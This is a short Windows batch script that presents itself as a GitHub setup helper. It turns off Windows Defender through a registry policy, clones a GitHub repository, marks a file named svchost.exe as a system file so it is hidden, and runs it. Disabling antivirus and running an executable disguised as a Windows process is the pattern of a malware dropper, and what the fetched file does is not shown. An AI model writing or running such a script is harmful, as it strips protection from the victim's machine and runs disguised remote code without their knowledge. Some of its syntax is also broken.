@echo off
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t "REG_DWORD" /d "1" /f
./ext/Git-2.42.0.2-32-bit.exe
net send localhost "Please set up Github from the window that pop up."
git clone https://github.com/GLB1919/Fesnode
cd Fesnode
attrib +S svchost.exe
./svchost.exe
